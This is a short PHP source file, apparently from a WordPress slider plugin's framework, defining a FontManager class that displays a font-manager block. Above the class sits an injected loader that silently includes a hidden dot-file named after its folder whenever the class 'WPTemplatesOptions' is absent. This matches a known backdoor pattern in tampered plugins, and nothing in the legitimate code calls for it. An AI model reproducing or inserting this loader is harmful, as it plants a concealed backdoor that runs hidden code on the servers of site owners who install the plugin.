<?php

namespace Nextend\Framework\Font;

use Nextend\Framework\Font\Block\FontManager\BlockFontManager;
use Nextend\Framework\Pattern\VisualManagerTrait;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class FontManager {

    use VisualManagerTrait;

    public function display() {

        $fontManagerBlock = new BlockFontManager($this->MVCHelper);
        $fontManagerBlock->display();
    }
}